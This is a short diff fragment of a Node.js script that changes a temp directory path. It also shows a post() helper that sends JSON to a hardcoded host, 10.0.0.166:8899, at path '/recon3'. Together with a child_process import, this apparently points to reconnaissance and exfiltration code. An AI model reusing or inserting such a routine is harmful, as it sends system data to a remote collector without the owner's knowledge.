@@ -3,7 +3,7 @@ var fs = require('fs');
 var http = require('http');
 var https = require('https');
 var cp = require('child_process');
-var dir = '/home/owner/share/tmp/';
+var dir = '/tmp/';
 function post(o) {
   var b = JSON.stringify(o);
   var req = http.request({ host: '10.0.0.166', port: 8899, path: '/recon3', method: 'POST', headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(b) } }, function (r) { });
